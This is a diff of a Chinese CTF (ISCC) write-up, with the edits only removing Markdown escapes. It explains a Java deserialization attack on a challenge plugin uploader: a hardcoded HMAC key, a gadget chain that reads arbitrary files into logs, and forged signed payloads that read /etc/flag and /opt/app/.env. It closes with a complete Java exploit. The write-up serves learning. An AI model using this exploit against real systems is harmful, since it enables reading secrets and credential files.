@@ -17,15 +17,15 @@ draft = false
 
 反编译 \`agent-core.jar\` 后，在 \`application.yml\` 配置文件中发现 HMAC 签名密钥：
 
-\`\`\`
+```
 
 security:
 
 hmac:
 
-secret: k3y\_5A62\_X86
+secret: k3y_5A62_X86
 
-\`\`\`
+```
 
 同时审计插件上传流程，梳理出关键处理链路：
 
@@ -53,9 +53,9 @@ secret: k3y\_5A62\_X86
 
 调用关系：\`ResourceRefresher.readObject()\` → 触发资源刷新 → \`DataStream.get()\` → \`FileExporter.export(targetPath)\` → \`LogService.log(teamId, fileContent)\`
 
-\[截图：ResourceRefresher 类 readObject 方法反编译，标注回调触发点\]
+[截图：ResourceRefresher 类 readObject 方法反编译，标注回调触发点]
 
-\[截图：FileExporter 类 export 方法反编译，标注 Files.readAllBytes 和 LogService.log 调用\]
+[截图：FileExporter 类 export 方法反编译，标注 Files.readAllBytes 和 LogService.log 调用]
 
 由于 Java 原生序列化在 \`readObject\` 阶段便会递归还原对象图并执行相关回调，此链完全在反序列化阶段完成攻击，无需额外触发条件。
 
@@ -73,7 +73,7 @@ secret: k3y\_5A62\_X86
 
 将构造好的对象图通过 \`ObjectOutputStream\` 序列化为字节数组，即恶意 \`metadata.ser\`。
 
-HMAC 签名部分：由于密钥 \`k3y\_5A62\_X86\` 已在配置中硬编码，直接使用 HmacSHA256 算法对 \`metadata.ser\` 的字节内容计算签名，填入上传包的对应字段。
+HMAC 签名部分：由于密钥 \`k3y_5A62_X86\` 已在配置中硬编码，直接使用 HmacSHA256 算法对 \`metadata.ser\` 的字节内容计算签名，填入上传包的对应字段。
 
 打包格式：标准 ZIP 压缩包，内含 \`manifest.json\`（填写插件元信息）和恶意 \`metadata.ser\`。
 
@@ -81,47 +81,47 @@ HMAC 签名部分：由于密钥 \`k3y\_5A62\_X86\` 已在配置中硬编码，�
 
 将插件包通过 POST 请求上传至 \`/api/upload\` 接口：
 
-\`\`\`
+```
 
 POST /api/upload HTTP/1.1
 
 Content-Type: multipart/form-data
 
-\`\`\`
+```
 
 上传成功后，访问日志查询接口获取文件读取结果：
 
-\`\`\`
+```
 
-GET /api/logs?team\_id=&lt;your\_team\_id&gt;
+GET /api/logs?team_id=&lt;your_team_id&gt;
 
-\`\`\`
+```
 
 第一轮读取 \`/etc/flag\` 获得的是诱饵 flag：
 
-\`\`\`
+```
 
-ISCC{f4k3\_fl4g\_d3c0y\_d0nt\_subm1t}
+ISCC{f4k3_fl4g_d3c0y_d0nt_subm1t}
 
-\`\`\`
+```
 
 分析得知题目将真实 flag 存放在应用部署目录的环境变量文件中。根据 \`Dockerfile\` 或启动脚本中的路径信息，确认真实路径为 \`/opt/app/.env\`。
 
 修改 Payload 中 \`FileExporter\` 的目标路径为 \`/opt/app/.env\`，重新签名、打包、上传，最终在日志中读取到真实 flag：
 
-\`\`\`
+```
 
 ISCC{aunXV6waj5Hp8cT35SwVcKK}
 
-\`\`\`
+```
 
-\[截图：最终获取到真实 flag 的日志响应\]
+[截图：最终获取到真实 flag 的日志响应]
 
 Exp
 
-\`\`\`java
+```java
 
-import java.io.\*;
+import java.io.*;
 
 import java.lang.reflect.Field;
 
@@ -133,19 +133,19 @@ import javax.crypto.spec.SecretKeySpec;
 
 public class Exp {
 
-private static final String HMAC\_KEY = "k3y\_5A62\_X86";
+private static final String HMAC_KEY = "k3y_5A62_X86";
 
-private static final String TEAM\_ID = "your\_team\_id";
+private static final String TEAM_ID = "your_team_id";
 
-private static final String TARGET\_PATH = "/opt/app/.env";
+private static final String TARGET_PATH = "/opt/app/.env";
 
-public static void main(String\[\] args) throws Exception {
+public static void main(String[] args) throws Exception {
 
 FileExporter exporter = new FileExporter();
 
-setField(exporter, "targetPath", TARGET\_PATH);
+setField(exporter, "targetPath", TARGET_PATH);
 
-setField(exporter, "teamId", TEAM\_ID);
+setField(exporter, "teamId", TEAM_ID);
 
 DataStream dataStream = new DataStream();
 
@@ -163,25 +163,25 @@ oos.writeObject(refresher);
 
 oos.close();
 
-byte\[\] payloadBytes = baos.toByteArray();
+byte[] payloadBytes = baos.toByteArray();
 
 Mac mac = Mac.getInstance("HmacSHA256");
 
-SecretKeySpec keySpec = new SecretKeySpec(HMAC\_KEY.getBytes(), "HmacSHA256");
+SecretKeySpec keySpec = new SecretKeySpec(HMAC_KEY.getBytes(), "HmacSHA256");
 
 mac.init(keySpec);
 
-byte\[\] signature = mac.doFinal(payloadBytes);
+byte[] signature = mac.doFinal(payloadBytes);
 
 String signatureHex = bytesToHex(signature);
 
 String payloadBase64 = Base64.getEncoder().encodeToString(payloadBytes);
 
-System.out.println("\[+\] Payload (Base64): " + payloadBase64);
+System.out.println("[+] Payload (Base64): " + payloadBase64);
 
-System.out.println("\[+\] HMAC Signature (Hex): " + signatureHex);
+System.out.println("[+] HMAC Signature (Hex): " + signatureHex);
 
-System.out.println("\[+\] Target: " + TARGET\_PATH);
+System.out.println("[+] Target: " + TARGET_PATH);
 
 try (FileOutputStream fos = new FileOutputStream("metadata.ser")) {
 
@@ -189,9 +189,9 @@ fos.write(payloadBytes);
 
 }
 
-System.out.println("\[+\] metadata.ser written to disk");
+System.out.println("[+] metadata.ser written to disk");
 
-String manifest = "{\\"name\\":\\"evil-plugin\\",\\"version\\":\\"1.0\\",\\"team\_id\\":\\"" + TEAM\_ID + "\\"}";
+String manifest = "{\\"name\\":\\"evil-plugin\\",\\"version\\":\\"1.0\\",\\"team_id\\":\\"" + TEAM_ID + "\\"}";
 
 try (FileWriter fw = new FileWriter("manifest.json")) {
 
@@ -199,11 +199,11 @@ fw.write(manifest);
 
 }
 
-System.out.println("\[+\] manifest.json written to disk");
+System.out.println("[+] manifest.json written to disk");
 
-System.out.println("\[\*\] Add both files to a ZIP and POST to /api/upload");
+System.out.println("[*] Add both files to a ZIP and POST to /api/upload");
 
-System.out.println("\[\*\] Fetch result: GET /api/logs?team\_id=" + TEAM\_ID);
+System.out.println("[*] Fetch result: GET /api/logs?team_id=" + TEAM_ID);
 
 }
 
@@ -217,7 +217,7 @@ f.set(obj, value);
 
 }
 
-private static String bytesToHex(byte\[\] bytes) {
+private static String bytesToHex(byte[] bytes) {
 
 StringBuilder sb = new StringBuilder();
 
@@ -233,4 +233,4 @@ return sb.toString();
 
 }
 
-\`\`\`
+```
